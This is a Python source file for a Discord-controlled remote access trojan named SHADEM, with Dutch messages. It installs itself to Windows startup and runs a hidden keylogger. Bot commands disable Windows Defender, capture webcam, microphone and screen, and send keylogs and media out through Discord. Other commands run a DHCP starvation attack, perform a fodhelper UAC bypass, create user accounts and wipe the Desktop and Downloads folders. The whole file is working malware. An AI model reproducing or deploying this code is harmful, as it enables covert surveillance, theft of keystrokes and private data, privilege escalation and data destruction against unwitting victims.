import discord 
from discord.ext import commands
from pynput.keyboard import Key, Listener
import logging
import shutil
from io import StringIO
import tempfile
import subprocess
import winreg as reg
import os
import time
import cv2
from scapy.all import *
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp
import threading
from config import DISCORD_TOKEN
from mss import mss
import pyaudio
import wave
import asyncio
from pathlib import Path
from logging.handlers import RotatingFileHandler

print('''   

  █████████  █████   █████   █████████   ██████████   ██████████ ██████   ██████
 ███░░░░░███░░███   ░░███   ███░░░░░███ ░░███░░░░███ ░░███░░░░░█░░██████ ██████ 
░███    ░░░  ░███    ░███  ░███    ░███  ░███   ░░███ ░███  █ ░  ░███░█████░███ 
░░█████████  ░███████████  ░███████████  ░███    ░███ ░██████    ░███░░███ ░███ 
 ░░░░░░░░███ ░███░░░░░███  ░███░░░░░███  ░███    ░███ ░███░░█    ░███ ░░░  ░███ 
 ███    ░███ ░███    ░███  ░███    ░███  ░███    ███  ░███ ░   █ ░███      ░███ 
░░█████████  █████   █████ █████   █████ ██████████   ██████████ █████     █████
 ░░░░░░░░░  ░░░░░   ░░░░░ ░░░░░   ░░░░░ ░░░░░░░░░░   ░░░░░░░░░░ ░░░░░     ░░░░░ 
                                                                                
                                                                                ''')
print("Made by Erdem & Shafiq")

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = sys.executable if getattr(sys, 'frozen', False) else os.path.realpath(__file__)
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        value_name = "SHADEM"  
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, value_name, 0, reg.REG_SZ, file_path)
        reg.CloseKey(key)
        print("Succesvol toegevoegd aan opstart.")
    except Exception as e:
        print(f'Fout bij het toevoegen aan opstart: {e}')

if __name__ == "__main__":
    add_to_startup()

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot is ingelogd als {bot.user.name}')
    print(f'{bot.user.name} is verbonden met Discord!')
    kanaal = bot.get_channel(1204015232662507584)
    bericht = "Iemand heeft verbinding gemaakt me de server - SHADEM Bot staat tot uw dienst! !help voor meer informatie"
    banner_url = 'https://i.imgur.com/NgumOPE.png'
    embed = discord.Embed(title="Welkom!", description=bericht, color=0x00ff00)
    embed.set_image(url=banner_url)
    
    await kanaal.send(embed=embed)

bot.remove_command('help')

@bot.command()
async def help(ctx):
    help_message = "Hier zijn de commando's die je kunt gebruiken:\n"
    help_message += "!help - Toont dit helpbericht\n"
    help_message += "!disable_defender - Schakelt Windows Defender uit via PowerShell\n"
    help_message += "!webcam - Activeert de webcam en neemt een foto\n"
    help_message += "!record_audio - Activeert de microfoon en neemt een geluidsopname\n"
    help_message += "!screenshot - Maakt een screenshot van het huidige scherm\n"
    help_message += "!keylogs - Stuurt de keylogs vanaf het moment dat het script is gerund\n"
    help_message += "!dhcp_starvation - Voert een DHCP starvation aanval uit\n"
    help_message += "!stop_attack - Zorgt ervoor dat de dhcp starvation attack wordt gestopt\n"
    help_message += "!create_user - Maakt een nieuwe gebruiker aan in Windows\n"
    help_message += "!admincheck - Kijkt of de gebruiker adminrechten heeft in het systeem\n"
    help_message += "!clear_desktop - verwijdert de desktop folder op het systeem\n"
    help_message += "!clear_downloads - verwijdert de Downloads folder op het systeem\n"
    help_message += "!open_notepad - opent 15x de notepad app op het systeem\n"
    help_message += "!shutdown - Sluit het systeem af\n"
    help_message += "!restart - Zorgt ervoor dat het systeem opnieuw gaat opstarten\n"
    help_message += "!logoff - Logt de huidige gebruiker uit\n"
    help_message += "!uacbypass - Probeert het script te runnen als admin door een uacbypass\n"
    await ctx.send(help_message)

@bot.command()
async def disable_defender(ctx):
    ps_command = 'Set-MpPreference -DisableRealtimeMonitoring $true'
    ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell.exe", f"-Command {ps_command}", None, 1)
    await ctx.send("Verzoek om Windows Defender uit te schakelen is verzonden.")

@bot.command()
async def screenshot(ctx):
    with mss() as sct:
        filename = sct.shot(output=os.path.join(os.getcwd(), 'screen.png'))
        await ctx.send(file=discord.File(filename))
    await ctx.send("Screenshot succesvol genomen en verzonden!")  
  
@bot.command()
async def admincheck(ctx):
    """Controleert of het script met admin rechten draait."""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin:
        await ctx.send("[*] Gefeliciteerd, je bent admin.")
    else:
        await ctx.send("[!] Helaas, je bent geen admin.")   

@bot.command()
async def record_audio(ctx, seconds: int = 5):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = seconds
    WAVE_OUTPUT_FILENAME = "output.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    await ctx.send(f"Start opname voor {RECORD_SECONDS} seconden.")

    frames = []

    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    await ctx.send("Opname voltooid.")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

    await ctx.send(file=discord.File(WAVE_OUTPUT_FILENAME))
    os.remove(WAVE_OUTPUT_FILENAME)  
    await ctx.send("Audio opname succesvol voltooid en verzonden!")

@bot.command()
async def webcam(ctx):
    cam = cv2.VideoCapture(0)  
    if not cam.isOpened():
        cam = cv2.VideoCapture(1) 
        if not cam.isOpened():
            await ctx.send("Kon geen toegang krijgen tot de webcam.")
            return
    ret, frame = cam.read()
    if not ret:
        await ctx.send("Kon geen foto maken met de webcam.")
        return
    img_name = "webcam_photo.png"
    cv2.imwrite(img_name, frame)
    cam.release()

    await ctx.send(file=discord.File(img_name))
    os.remove(img_name)  

log_dir = os.path.join(os.getenv('APPDATA'), 'MijnBotLogs')
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
log_file_path = os.path.join(log_dir, "keylog.txt")

logger = logging.getLogger("keylogger")
logger.setLevel(logging.INFO)

handler = RotatingFileHandler(log_file_path, maxBytes=1000000, backupCount=1)
handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
handler.terminator = ''  
logger.addHandler(handler)

def on_press(key):
    try:
        logger.info(str(key))
    finally:
        handler.flush()  

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

@bot.command()
async def keylogs(ctx):
    if os.path.exists(log_file_path) and os.path.getsize(log_file_path) > 0:
        await ctx.send(file=discord.File(log_file_path))
        os.remove(log_file_path)  
        logger.handlers[0].stream.close()  
        logger.removeHandler(logger.handlers[0])  
        handler = RotatingFileHandler(log_file_path, maxBytes=1000000, backupCount=1)
        handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s'))
        handler.terminator = ''  
        logger.addHandler(handler)
    else:
        await ctx.send("Geen keylogbestand gevonden of het bestand is leeg.")

is_attacking = False

@bot.command()
async def dhcp_starvation(ctx):
    global is_attacking
    if is_attacking:
        await ctx.send("Er is al een DHCP Starvation aanval actief.")
        return

    is_attacking = True
    await ctx.send("Starten van DHCP Starvation aanval...")
    count = 0
    try:
        while is_attacking:
            fake_mac = str(RandMAC())
            dhcp_discover = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(chaddr=[fake_mac.encode()]) / DHCP(options=[("message-type", "discover"), "end"])
            sendp(dhcp_discover, verbose=False)
            count += 1
            if count % 10 == 0:  
                await ctx.send("DHCP Starvation aanval is nog steeds bezig...")
            await asyncio.sleep(10)  
    except Exception as e:
        await ctx.send(f"Er is een fout opgetreden: {str(e)}")
    finally:
        is_attacking = False

@bot.command()
async def stop_attack(ctx):
    global is_attacking
    if is_attacking:
        is_attacking = False
        await ctx.send("DHCP Starvation aanval wordt gestopt...")
    else:
        await ctx.send("Er is momenteel geen aanval actief.")

@bot.command()
async def clear_desktop(ctx):
    desktop_path = Path(os.environ['USERPROFILE'], 'Desktop')
    if desktop_path.exists() and desktop_path.is_dir():
        try:
            for item in desktop_path.iterdir():  
                if item.is_file():
                    item.unlink()  
                elif item.is_dir():
                    shutil.rmtree(item)  
            await ctx.send("Alle bestanden en mappen op de Desktop zijn succesvol verwijderd.")
        except Exception as e:
            await ctx.send(f"Er is een fout opgetreden: {str(e)}")
    else:
        await ctx.send(f"Kan de Desktop map niet vinden: {desktop_path}")

@bot.command()
async def open_notepad(ctx):
    try:
        for _ in range(15):  
            subprocess.Popen(["notepad.exe"])
        await ctx.send("Notepad is meerdere keren geopend.")
    except Exception as e:
        await ctx.send(f"Er is een fout opgetreden: {str(e)}")

@bot.command()
async def clear_downloads(ctx):
    downloads_path = Path.home() / 'Downloads'
    if downloads_path.exists() and downloads_path.is_dir():
        try:
            for item in downloads_path.iterdir():  
                if item.is_file():
                    item.unlink()  
                elif item.is_dir():
                    shutil.rmtree(item)  
            await ctx.send("Alle bestanden en mappen in de Downloads zijn succesvol verwijderd.")
        except Exception as e:
            await ctx.send(f"Er is een fout opgetreden: {str(e)}")
    else:
        await ctx.send(f"Kan de Downloads map niet vinden: {downloads_path}")

@bot.command()
async def shutdown(ctx):
    os.system("shutdown /p")
    await ctx.send("[*] Command successfuly executed")

@bot.command()
async def restart(ctx):
    os.system("shutdown /r /t 0")
    await ctx.send("[*] Command successfuly executed")

@bot.command()
async def logoff(ctx):
    os.system("shutdown /l /f")
    await ctx.send("[*] Command successfuly executed")

@bot.command()
async def uacbypass(ctx):
            import winreg
            import ctypes
            import sys
            import os
            import time
            import inspect
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                await ctx.send("Your already admin!")
            else:
                class disable_fsr():
                    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                    def __enter__(self):
                        self.old_value = ctypes.c_long()
                        self.success = self.disable(ctypes.byref(self.old_value))
                    def __exit__(self, type, value, traceback):
                        if self.success:
                            self.revert(self.old_value)
                await ctx.send("attempting to get admin!")
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if not isexe:
                    test_str = sys.argv[0]
                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
                    cmd2 = current_dir
                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                else:
                    test_str = sys.argv[0]
                    current_dir = test_str
                    cmd2 = current_dir
                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
                    os.system(create_reg_path)
                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
                    os.system(create_trigger_reg_key) 
                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
                    os.system(create_payload_reg_key)
                with disable_fsr():
                    os.system("fodhelper.exe")  
                time.sleep(2)
                remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
                os.system(remove_reg)    

@bot.command()
async def create_user(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Wat is de gewenste gebruikersnaam?")
    try:
        username_msg = await bot.wait_for('message', check=check, timeout=30.0)
    except asyncio.TimeoutError:
        await ctx.send("Je hebt niet op tijd geantwoord.")
        return

    await ctx.send("Wat is het gewenste wachtwoord?")
    try:
        password_msg = await bot.wait_for('message', check=check, timeout=30.0) 
    except asyncio.TimeoutError:
        await ctx.send("Je hebt niet op tijd geantwoord.")
        return

    username = username_msg.content
    password = password_msg.content

    try:
        result = subprocess.run(["net", "user", username, password, "/add"], capture_output=True, text=True, shell=True)
        if result.returncode == 0:
            await ctx.send("Gebruiker succesvol aangemaakt.")
        else:
            await ctx.send(f"Fout bij het aanmaken van gebruiker: {result.stderr}")
    except Exception as e:
        await ctx.send(f"Er is een onverwachte fout opgetreden: {str(e)}")

bot.run(DISCORD_TOKEN)